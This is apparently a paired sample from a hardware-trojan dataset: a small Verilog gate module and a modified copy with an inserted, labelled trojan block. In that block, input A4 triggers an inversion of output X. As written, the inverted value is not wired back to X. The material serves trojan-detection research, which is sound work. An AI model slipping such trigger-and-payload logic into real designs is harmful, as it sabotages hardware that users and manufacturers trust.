original_rtl:
module my_module (
    A1,
    A2,
    A3,
    A4,
    B1,
    X
);

    // Module ports
    input  A1;
    input  A2;
    input  A3;
    input  A4;
    input  B1;
    output X;

    // Local signals
    wire [3:0] and0_out ;
    wire or0_out_X;

    //  Name  Output     Other arguments
    and and0 (and0_out , A1, A2, A3, A4 );
    or  or0  (or0_out_X, and0_out, B1   );
    buf buf0 (X        , or0_out_X      );

endmodule

modified_rtl:
    module my_module (
    A1,
    A2,
    A3,
    A4,
    B1,
    X
);

    // Module ports
    input A1;
    input A2;
    input A3;
    input A4;
    input B1;
    output X;

    // Local signals
    wire [3:0] and0_out ;
    wire or0_out_X;

    // Name Output Other arguments
    and and0 (and0_out , A1, A2, A3, A4 );
    or or0 (or0_out_X, and0_out, B1 );
    buf buf0 (X , or0_out_X );

// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (A4 == 1'b1);
    htrojan_pay = htrojan_trig ? (X ^ 1'b1) : X;
end
// HT_END
endmodule
